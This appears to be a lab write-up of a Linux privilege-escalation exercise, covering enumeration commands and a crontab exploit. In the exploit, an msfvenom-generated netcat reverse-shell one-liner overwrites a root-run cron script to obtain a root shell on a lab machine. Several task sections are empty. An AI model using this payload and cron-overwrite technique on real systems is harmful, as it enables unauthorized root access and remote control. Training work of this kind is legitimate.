# Common Linux Privesc Writeup

## [Task 1 - 3]

Follow The Readings Provided

## [Task 4] Enumeration

### 1 SSH into machine with the provided credentials 

username = user3
password = password

- ssh user3@10.10.x.x
![1](https://user-images.githubusercontent.com/69840849/90487228-85318c80-e17d-11ea-97a6-4fae52b8f968.png)

### 2 What is the target's hostname?

- hostname
![1](https://user-images.githubusercontent.com/69840849/90487310-a4c8b500-e17d-11ea-8c13-e124db0080e5.png)
 
### 3 Look at the output of /etc/passwd how many "user[x]" are there on the system?

- cat /etc/passwd
![1](https://user-images.githubusercontent.com/69840849/90487951-7f887680-e17e-11ea-9a89-695bbae5f50e.png)

### 4 How many available shells are there on the system?

- cat /etc/shells
![1](https://user-images.githubusercontent.com/69840849/90487873-654e9880-e17e-11ea-930b-d8a76d45b608.png)

### 5 What is the name of the bash script that is set to run every 5 minutes by cron? 

- cat /etc/crontab
[ ! ] You should be able to find the name of the .sh file
![1](https://user-images.githubusercontent.com/69840849/90487765-405a2580-e17e-11ea-917b-2c482e84784c.png)

### 6 What critical file has had its permissions changed to allow some users to write to it?

- ls -la /etc/passwd
![1](https://user-images.githubusercontent.com/69840849/90488017-9929be00-e17e-11ea-8e7b-2a970579333e.png)

### 7 Enumeration Completed

## [Task 5] Abusing SUID/GUID Files

## [Task 6] Exploiting Writeable /etc/passwd 

## [Task 7] Escaping Vi Editor 

## [Task 8] Exploiting Crontab 

### 1 Switch user to User4 with the provided credentials 

username = user4
password = password

- su user4
![1](https://user-images.githubusercontent.com/69840849/90488480-53b9c080-e17f-11ea-8e7b-a8fcd383bbd4.png)

### 2 Msfvenom
-

### 3 What is the flag to specify a payload in msfvenom?

[ ! ] You can find the answer by using 
- msfvenom -h

### 4 Create a payload using: 

- msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R
[ ! ] Reminder, LOCALIP depends on your own machine, I will be using 10.10.0.0 as an example! 
[ ! ] In this situation, we can use port 8888. We can use another port number such as 1234 as long as the netcat listener is also set to 1234
![1](https://user-images.githubusercontent.com/69840849/90489384-8f08bf00-e180-11ea-9dcc-e3927b6bf169.png)

### 5 What directory is the "autoscript.sh" under?

- cat /etc/crontab
![1](https://user-images.githubusercontent.com/69840849/90487765-405a2580-e17e-11ea-917b-2c482e84784c.png)

### 6 Lets replace the contents of the file with our payload using: "echo [MSFVENOM OUTPUT] > autoscript.sh"

- echo "mkfifo /tmp/qjqlxog; nc 10.10.0.0 8888 0</tmp/qjqlxog | /bin/sh >/tmp/qjqlxog 2>&1; rm /tmp/qjqlxog" > autoscript.sh


### 7 After copying the code into autoscript.sh file we wait for cron to execute the file, and start our netcat listener using:
- nc -lnvp 8888
![1](https://user-images.githubusercontent.com/69840849/90490101-895fa900-e181-11ea-8166-ca5a4a637815.png)


### 8 After about 5 minutes, you should have a shell as root land in your netcat listening session! Congratulations! 
[ ! ] You may use the follow to check if it worked
- whoami
![1](https://user-images.githubusercontent.com/69840849/90490473-01c66a00-e182-11ea-88c6-f84af16895ba.png)


## [Task 9] Exploiting PATH Variable 

## [Task 10] Expanding Your Knowledge 

Follow The Readings Provided
